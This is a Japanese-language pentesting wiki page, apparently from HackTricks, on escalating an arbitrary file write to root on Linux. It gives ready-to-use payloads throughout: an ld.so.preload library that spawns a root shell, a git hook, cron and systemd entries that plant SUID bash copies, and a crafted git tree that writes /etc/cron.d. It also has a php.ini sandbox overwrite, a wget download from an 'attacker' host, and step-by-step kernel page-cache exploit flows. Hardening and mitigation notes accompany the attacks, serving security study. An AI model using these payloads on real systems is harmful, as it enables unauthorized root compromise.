# Rootへの任意ファイル書き込み

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` は、dynamic linker が他の shared objects より先に読み込む shared objects のシステム全体向けリストです。Secure-execution mode では preloading に追加の制限が適用されるため、`/tmp/pe.so` のような library path は、あらゆる SUID-binary に使える手法ではありません。\
これを作成または変更できる場合、このファイルを読み込むプロセスは、他の shared objects より先にリストされた library を読み込むため、そのプロセスの context で code execution が可能になります。<sup>[[12]](#references)</sup>

例: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** は、commit や merge 操作など、リポジトリ内のイベントに対して実行される executable script です。**privileged script または user** がこれらの操作を実行し、攻撃者が **`.git` フォルダーに write** できる場合、hook を **privilege escalation** に利用できます。<sup>[[13]](#references)</sup>

たとえば、git repo の **`.git/hooks`** に **script を生成**し、新しい commit が作成されるたびに常に実行されるようにすることが可能です。
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### 特権 Git tree export path traversal

特権を持つ synchronizer は checkout を避け、`git ls-tree` で attacker の影響を受ける repository を列挙し、`git cat-file` で各 blob を読み取り、報告された pathname を staging directory に結合して自ら書き込むことがあります。`-c safe.directory=*`（Git の異なる所有者の repository に対する guard を無効化）と、destination の containment check がない状態を組み合わせると、これは **synchronizer の権限による arbitrary file write** になります。絶対 tree-entry name を指定すると、Python の `os.path.join(stage, name)` によって `stage` が破棄されます。filesystem が解決する際、`../` を含む相対 name は外部へ脱出します。application は Git に checkout を実行させるのではなく raw tree を materialize するため、checkout 時の pathname rejection ではこの sink を保護できません。<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

root services、timers、deployment agents、template importers、backup/restore jobs で、次のような code shape を探してください。<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
ツリーエントリは `<mode> SP <name> NUL <raw object ID>` としてエンコードされます。`git hash-object --literally` オプションは、通常の parsing や `git fsck` では拒否される可能性のある object data を意図的に許可するため、使い捨ての clone で、filename が絶対 destination となる tree を構築できます。この例では cron-file の blob を作成し、細工した tree を commit でラップして、branch をそこへ移動します。ただし exploitation には、privileged job が使用する repository を更新する権限と、不正な object を受け入れる Git server が必要です。<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening では、repository の取り込みと最終的な filesystem 操作の両方を対象にする必要があります:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- `safe.directory=*` を、service が trust する必要のある正確な repository に置き換え、可能な場合は root privileges なしで repository processing を実行します。
- materialization の前に、absolute name と `.` または `..` component を拒否します。結合後に canonicalize し、destination が意図した root 配下に留まっていることを検証します。
- check-then-open による symlink race を避けます。trusted directory descriptor を基準に相対パスで open し、Linux では attacker-controlled path に対して `RESOLVE_BENEATH` と `RESOLVE_NO_SYMLINKS` を指定した `openat2()` を使用します。
- plumbing output から checkout を再実装するより、isolated directory 内で通常の checkout を行うことを優先します。raw-object ingestion が必要な場合は、`receive.fsckObjects=true` などの receive-side validation を有効にします。crafted tree を拒否するために必要な pathname 関連の `receive.fsck.*` findings を downgrade しないでください。

### Cron と Time files

**root が実行する cron 関連の files に write できる**場合、通常は次回の job 実行時に code execution を取得できます。興味深い target には次のものがあります:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`
- `/var/spool/cron/` または `/var/spool/cron/crontabs/` にある root 自身の crontab
- `systemd` timers と、それらが trigger する services

Quick checks:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
典型的な悪用経路：

- `/etc/crontab` または `/etc/cron.d/` 内のファイルに **新しい root cron job を追加**
- `run-parts` によってすでに実行されている **script を置き換える**
- 起動される script または binary を変更して、**既存の timer target に backdoor を仕込む**

最小限の cron payload の例：
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
`run-parts` が使用する cron ディレクトリ内にしか書き込めない場合は、代わりにそこへ実行可能ファイルを配置します。
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
注:

- `run-parts` は通常、ドットを含むファイル名を無視するため、`backup.sh` ではなく `backup` のような名前を優先します。<sup>[[15]](#references)</sup>
- 一部のシステムでは、従来の cron の代わりに `systemd` timers を使用しますが、abuse の考え方は同じです。つまり、**後で root が実行するものを変更する**ということです。<sup>[[20]](#references)</sup>

### Service & Socket files

**`systemd` unit files** またはそれらから参照されるファイルに書き込みできる場合、unit を reload して restart するか、service/socket activation path が trigger されるのを待つことで、root として code execution を得られる可能性があります。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Interesting targets には次のものがあります:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` 内の Drop-in overrides
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` から参照される Service scripts/binaries
- root service によって読み込まれる書き込み可能な `EnvironmentFile=` paths

簡単な確認方法:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
一般的な悪用経路:

- **Overwrite `ExecStart=`** in a root-owned service unit you can modify
- **Add a drop-in override** with a malicious `ExecStart=` and clear the old one first
- **Backdoor the script/binary** already referenced by the unit
- **Hijack a socket-activated service** by modifying the corresponding `.service` file that starts when the socket receives a connection

悪意のある override の例:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
典型的なアクティベーションフロー:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
自分でサービスを再起動できなくても、socket-activated unitを編集できる場合は、**クライアント接続を待つだけ**で、backdoor化したサービスをrootとして実行させられる可能性があります。<sup>[[17]](#references)</sup>

### 特権PHP sandboxで使用される制限付き`php.ini`を上書きする

一部のカスタムdaemonは、**制限付き`php.ini`**（例：`disable_functions=exec,system,...`）を指定して`php`を実行することで、ユーザーが提供したPHPを検証します。sandbox内のコードに**何らかの書き込みプリミティブ**（`file_put_contents`など）が残っており、daemonが使用する**正確な`php.ini`のパス**にアクセスできる場合、その設定を**上書き**して制限を解除し、その後、昇格した権限で実行される2つ目のpayloadを送信できます。<sup>[[2]](#references)</sup>

一般的な流れ：

1. 1つ目のpayloadでsandboxの設定を上書きする。
2. 危険な関数が再有効化された状態で、2つ目のpayloadがコードを実行する。

最小限の例（daemonが使用するパスに置き換えてください）：
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
デーモンが root として実行される場合（または root 所有のパスで検証する場合）、2 回目の実行によって root context が得られます。これは、sandboxed runtime がファイルを書き込める場合における、基本的に **config overwrite による privilege escalation** です。

### binfmt_misc

`binfmt_misc` は `/proc/sys/fs/binfmt_misc` 配下で registration を公開します。各 registration は、ファイル形式のパターンと interpreter を関連付けます。privilege への影響は、誰が registration を変更できるか、また後続のプロセスが matching file を実行するかどうかに依存します。そのため、これらの要件を確認してから privilege-escalation path として扱ってください。<sup>[[21]](#references)</sup>

### Overwrite schema handlers（http: や https: など）

Desktop environment は、URI scheme に使用する application を選択するために MIME association と desktop entry を使用します。攻撃者が、関連する per-user configuration および desktop-entry directory に書き込める場合、それらの scheme を攻撃者が制御する launcher に redirect できます。`$HOME/.config/mimeapps.list` ファイルを変更して、HTTP および HTTPS URL handler を malicious file（例: `x-scheme-handler/http=evil.desktop` および `x-scheme-handler/https=evil.desktop`）に指定すると、ユーザーの click によってその desktop entry を invoke できます。<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root が user-writable な scripts/binaries を実行する場合

特権ワークフローが `/bin/sh /home/username/.../script` のようなもの（または非特権ユーザーが所有するディレクトリ内のバイナリ）を実行する場合、それを hijack できます:<sup>[[1]](#references)</sup>

- **実行を検出する:** pspy でプロセスを監視し、root が user-controlled なパスを呼び出していることを確認します。<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **書き込み可能性を確認:** 対象ファイルとそのディレクトリの両方が、自分の user によって所有されている、または書き込み可能であることを確認します。
- **対象を hijack:** 元の binary/script を backup し、SUID shell（またはその他の root action）を作成する payload を配置してから、permissions を復元します。
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **privileged action をトリガーする**（例: helper を起動する UI ボタンを押す）。root が hijacked path を再実行したら、`./rootshell -p` で escalated shell を取得します。

### privileged binary の page-cache-only file modification

一部の kernel bug は、**ディスク上のファイル**を変更しません。代わりに、読み取り可能なファイルの **page cache copy** だけを変更できます。**setuid** またはその他の方法で **root が実行する** binary を対象にできれば、ディスク上のファイル hash が変わっていなくても、次回の実行時にメモリ上の attacker-controlled bytes が実行され、privileges を escalate できる可能性があります。<sup>[[3]](#references)[[4]](#references)</sup>

これは **runtime-only file write primitive** として考えると便利です。<sup>[[3]](#references)</sup>

- **Disk stays clean**: inode とディスク上の bytes は変化しない
- **Memory is dirty**: cached page を読み取りまたは実行する process は、attacker が変更した content を取得する
- **Effect is temporary**: reboot または cache eviction 後に変更は消える

この primitive は、classic な **arbitrary file write** と、Dirty COW / Dirty Pipe などの古い **page-cache abuse** bug の中間に位置します。<sup>[[3]](#references)</sup>

- Dirty COW は race に依存していた
- Dirty Pipe には write-position の制約があった
- page-cache-only primitive は、vulnerable path が cached file-backed pages への direct write を提供する場合、より reliable になり得る

#### Generic privesc flow

1. **file-backed page cache pages** に write できる kernel primitive を取得する
2. それを **readable な privileged binary** または別の root-executed file に対して使用する
3. page が cache から evict される **前に** execution をトリガーする
4. on-disk file が未変更に見える状態のまま、root として code execution を取得する

Typical high-value targets:

- **setuid-root** binaries
- **root services** によって起動される helpers
- **host kernel/page cache を共有する containers** からよく実行される binaries

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) は、この class の良い例です。vulnerable path は Linux crypto userspace API（`AF_ALG` / `algif_aead`）に存在していました。<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` は、readable file の page-cache pages への references を crypto TX scatterlist に移動できる
- in-place の `algif_aead` decrypt path は、source と destination buffers を再利用した
- `authencesn` はその後、destination tag region に write した
- その region が引き続き spliced file-backed pages を参照していた場合、write は **target file の page cache** に反映された

したがって、興味深い technique は CVE 自体ではなく、次の pattern です。

- **file-backed cache pages を kernel subsystem に feed する**
- subsystem にそれらを **writable output として扱わせる**
- memory 内で小さな controlled overwrite をトリガーする

公開された PoC は、繰り返し **4-byte writes** を使って `/usr/bin/su` を memory 内で patch し、その後実行しました。<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) は、同じ **page-cache-only write-to-root** pattern の別 variant を示しています。ただし今回は sink が `AF_ALG` ではなく **IPsec ESP decrypt** です。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

重要な technique は **metadata-laundering step** です。

- `splice()` は **read-only file-backed page-cache page** を ESP-in-UDP packet に配置する
- 元の DirtyFrag mitigation は、その skb に `SKBFL_SHARED_FRAG` を付け、`esp_input()` が decrypt 前に **copy** するようにしていた
- netfilter `TEE` は `nf_dup_ipv4()` -> `__pskb_copy_fclone()` を通じて packet を duplicate する
- clone は **同じ physical page-cache reference** を保持するが、`SKBFL_SHARED_FRAG` を失う
- その結果、`esp_input()` は clone を安全だと判断し、file-backed page に対して in-place `cbc(aes)` decrypt を実行する

したがって reviewer にとっての lesson は CVE よりも広範です。operation が先に copy する必要があるかどうかを **skb/page metadata** によって判断する mitigation では、backing page を保持したまま metadata を削除する **clone/copy path** が、気付かないうちに write primitive を再び有効にする可能性があります。

Typical exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` を実行し、**private network namespace 内で `CAP_NET_ADMIN`** を取得する
2. loopback を up にし、`mangle/OUTPUT` に **netfilter `TEE` rule** を install する
3. `NETLINK_XFRM` 経由で **XFRM ESP transport SAs** を install する
4. 各 target 4-byte word を SA の `seq_hi` field に encode する（DirtyFrag の word-selection trick）
5. spliced ESP-in-UDP packet を送信し、**TEE clone** が `esp_input()` に到達して in-place decrypt されるようにする
6. page-cache copy of `/usr/bin/su` または別の privileged executable に attacker-controlled code が含まれるまで繰り返す

Operationally、impact は `AF_ALG` example と同じです。ディスク上の file は clean なままですが、`execve()` は **mutated page-cache bytes** を使用し、root を取得できます。<sup>[[8]](#references)[[9]](#references)</sup>

この variant の Useful exposure checks:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
ここでの短期的な攻撃対象領域の縮小も path-specific です。`48f6a5356a33` を含む kernel に upgrade すると clone path が修正され、`xt_TEE` の autoload を block すると **flag-laundering step** が除去され、`esp4` / `esp6` を block すると **decrypt sink** が除去されます。<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure と hunting

このクラスの bug を疑う場合、disk integrity checks だけに依存しないでください。次も確認してください。
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
以下の設定値は、loadable interfaceとkernelに組み込まれたinterfaceを区別します。crypto build rulesは`CONFIG_CRYPTO_USER_API_AEAD`を`algif_aead`に対応付けます。<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead`はmoduleとしてloadable/unloadableにできます
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfaceはkernelに組み込まれます
- setuid binariesは、page-cache-only patchだけでlocal footholdをrootに昇格できる可能性があるため、優れたtargetです

#### `algif_aead` pathのAttack-surface reduction

vulnerable interfaceがloadable moduleによって提供されている場合:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
カーネルにコンパイルされている場合、以下の方法でinitパスをブロックできると報告されたdisclosureがあります:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
この種の緩和策は、他の kernel LPE についても覚えておく価値があります。exploit が特定の optional interface に依存している場合、その interface を無効化または blacklist に登録することで、kernel の完全な upgrade が利用可能になる前でも exploit path を断つことができます。<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – user-writable な PaperCut directory 内の root 実行 script の hijacking](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [CVE-2026-31431 に関する Openwall oss-security の disclosure](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - out-of-place での動作に revert](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint の technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Linux LPE variant DirtyClone (CVE-2026-43503) の dissecting と exploiting](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: `__pskb_copy_fclone()` で `SKBFL_SHARED_FRAG` を preserve (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: spliced UDP packets に `SKBFL_SHARED_FRAG` を set (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux の manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux の manual page](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian の manual page](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux の manual page](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git `hash-object` documentation](https://git-scm.com/docs/git-hash-object)
- [32] [Git `ls-tree` documentation](https://git-scm.com/docs/git-ls-tree)
- [33] [Git configuration documentation](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux の manual page](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
